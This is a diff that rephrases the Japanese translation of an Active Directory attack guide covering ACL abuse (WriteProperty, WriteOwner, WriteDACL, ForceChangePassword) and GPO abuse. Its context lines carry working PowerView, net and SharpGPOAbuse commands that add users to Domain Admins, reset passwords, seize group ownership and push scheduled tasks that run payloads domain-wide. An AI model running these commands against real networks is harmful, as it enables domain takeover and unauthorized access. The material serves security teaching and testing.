@@ -51,15 +51,15 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## **WriteProperty on Group**
 
-ユーザーが特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持っている場合、以下が可能です：
+特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権利を持つユーザーは、以下を行うことができます：
 
-* **自分自身をDomain Adminsグループに追加する**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで実現でき、この方法はドメイン内での権限昇格を可能にします。
+* **自分をDomain Adminsグループに追加する**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで実現可能で、この方法によりドメイン内での権限昇格が可能になります。
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **自己 (自己メンバーシップ) グループへの追加**
+## **自己 (自己メンバーシップ) のグループ**
 
-この特権により、攻撃者は `Domain Admins` などの特定のグループに自分自身を追加することができます。グループメンバーシップを直接操作するコマンドを使用します。以下のコマンドシーケンスを使用すると、自己追加が可能です：
+この特権により、攻撃者は `Domain Admins` などの特定のグループに自分自身を追加することができます。次のコマンドシーケンスを使用すると、自己追加が可能になります：
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -72,7 +72,7 @@ net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-`User-Force-Change-Password`に対するユーザーの`ExtendedRight`を保持することで、現在のパスワードを知らなくてもパスワードのリセットが可能になります。この権利の確認とその悪用は、PowerShellや代替のコマンドラインツールを通じて行うことができ、インタラクティブセッションや非インタラクティブ環境向けのワンライナーを含む、ユーザーのパスワードをリセットするためのいくつかの方法を提供します。コマンドは、シンプルなPowerShellの呼び出しからLinux上の`rpcclient`の使用まで多岐にわたり、攻撃ベクトルの多様性を示しています。
+`User-Force-Change-Password`に対するユーザーの`ExtendedRight`を保持することで、現在のパスワードを知らなくてもパスワードをリセットできます。この権利の確認とその悪用は、PowerShellや代替のコマンドラインツールを通じて行うことができ、インタラクティブセッションや非インタラクティブ環境向けのワンライナーを含む、ユーザーのパスワードをリセットするためのいくつかの方法を提供します。コマンドは、シンプルなPowerShellの呼び出しからLinux上の`rpcclient`の使用まで多岐にわたり、攻撃ベクトルの多様性を示しています。
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -85,7 +85,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner on Group**
 
-攻撃者がグループに対して `WriteOwner` 権限を持っていることがわかった場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが `Domain Admins` の場合に特に影響が大きく、所有権を変更することでグループ属性やメンバーシップに対するより広範な制御が可能になります。このプロセスは、`Get-ObjectAcl` を使用して正しいオブジェクトを特定し、その後 `Set-DomainObjectOwner` を使用して、SID または名前で所有者を変更することを含みます。
+攻撃者がグループに対して `WriteOwner` 権限を持っていることがわかった場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが `Domain Admins` の場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広範な制御が可能になります。このプロセスは、`Get-ObjectAcl` を使用して正しいオブジェクトを特定し、その後 `Set-DomainObjectOwner` を使用して所有者を SID または名前で変更することを含みます。
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -109,7 +109,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-ADオブジェクトを所有し、その上で`WriteDACL`権限を持つことは、攻撃者がオブジェクトに対して`GenericAll`権限を付与することを可能にします。これはADSI操作を通じて実現され、オブジェクトに対する完全な制御とそのグループメンバーシップの変更が可能になります。それにもかかわらず、Active Directoryモジュールの`Set-Acl` / `Get-Acl` cmdletを使用してこれらの権限を悪用しようとする際には制限があります。
+ADオブジェクトを所有し、その上で`WriteDACL`権限を持つことは、攻撃者がオブジェクトに対して`GenericAll`権限を付与することを可能にします。これはADSI操作を通じて実現され、オブジェクトに対する完全な制御とそのグループメンバーシップを変更する能力を提供します。それにもかかわらず、Active Directoryモジュールの`Set-Acl` / `Get-Acl` cmdletを使用してこれらの権限を悪用しようとすると制限があります。
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -125,21 +125,21 @@ DCSync攻撃は、ドメイン上の特定のレプリケーション権限を�
 
 ### GPO委任
 
-グループポリシーオブジェクト（GPO）を管理するための委任されたアクセスは、重大なセキュリティリスクをもたらす可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されると、**WriteProperty**、**WriteDacl**、および**WriteOwner**のような特権を持つ可能性があります。これらの権限は、PowerViewを使用して特定された悪用の目的に利用される可能性があります: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+グループポリシーオブジェクト（GPO）を管理するための委任されたアクセスは、重大なセキュリティリスクをもたらす可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されると、**WriteProperty**、**WriteDacl**、および**WriteOwner**のような特権を持つ可能性があります。これらの権限は、PowerViewを使用して特定された悪用の目的に利用されることがあります: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### GPO権限の列挙
 
-誤って構成されたGPOを特定するために、PowerSploitのcmdletを連結することができます。これにより、特定のユーザーが管理する権限を持つGPOを発見することができます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+誤って構成されたGPOを特定するために、PowerSploitのcmdletを連結することができます。これにより、特定のユーザーが管理権限を持つGPOを発見することができます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 **適用されたポリシーを持つコンピュータ**: 特定のGPOが適用されるコンピュータを解決することが可能で、潜在的な影響の範囲を理解するのに役立ちます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **特定のコンピュータに適用されたポリシー**: 特定のコンピュータに適用されているポリシーを確認するには、`Get-DomainGPO`のようなコマンドを利用できます。
 
-**特定のポリシーが適用されたOU**: 特定のポリシーの影響を受ける組織単位（OU）を特定するには、`Get-DomainOU`を使用できます。
+**特定のポリシーが適用されたOU**: 特定のポリシーに影響を受ける組織単位（OU）を特定するには、`Get-DomainOU`を使用できます。
 
 ### GPOの悪用 - New-GPOImmediateTask
 
-誤って構成されたGPOは、コードを実行するために悪用される可能性があり、たとえば、即時スケジュールタスクを作成することによって実行できます。これにより、影響を受けたマシンのローカル管理者グループにユーザーを追加し、特権を大幅に昇格させることができます:
+誤って構成されたGPOは、コードを実行するために悪用される可能性があり、たとえば、即時スケジュールタスクを作成することによって実行されます。これにより、影響を受けたマシンのローカル管理者グループにユーザーを追加し、特権を大幅に昇格させることができます:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
@@ -152,7 +152,7 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 ```
 ### SharpGPOAbuse - GPOの悪用
 
-SharpGPOAbuseは、既存のGPOを悪用する方法を提供し、新しいGPOを作成することなくタスクを追加したり設定を変更したりします。このツールは、変更を適用する前に既存のGPOを変更するか、RSATツールを使用して新しいGPOを作成する必要があります。
+SharpGPOAbuseは、既存のGPOを悪用する方法を提供し、新しいGPOを作成することなくタスクを追加したり設定を変更したりします。このツールは、変更を適用する前に既存のGPOを変更するか、新しいGPOを作成するためにRSATツールを使用する必要があります。
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
@@ -168,11 +168,11 @@ GPOの更新は通常90分ごとに行われます。このプロセスを迅速
 
 ### ユーザーとグループ
 
-GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、ポリシーファイルを修正して新しいユーザーを含めたり、グループメンバーシップを変更したりすることが許可されます。
+GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、新しいユーザーを含めたり、グループメンバーシップを変更したりするためのポリシーファイルの修正を許可します。
 
-ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けたシステム全体で昇格された特権を付与することができます。この方法は、GPO操作を通じた特権昇格の直接的なアプローチを提供します。
+ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けたシステム全体で昇格された特権を付与することができます。この方法は、GPO操作を通じて特権昇格を直接的に行うアプローチを提供します。
 
-さらに、ログオン/ログオフスクリプトの活用、オートランのためのレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードを実行したり持続性を維持したりするための追加の方法も考慮できます。これらの技術は、GPOの悪用を通じてターゲットシステムへのアクセスを維持し、制御するためのさまざまな手段を提供します。
+さらに、ログオン/ログオフスクリプトの活用、オートラン用のレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードを実行したり持続性を維持したりするための追加の方法も考慮できます。これらの技術は、GPOの悪用を通じてターゲットシステムへのアクセスを維持し、制御するためのさまざまな手段を提供します。
 
 ## 参考文献
 
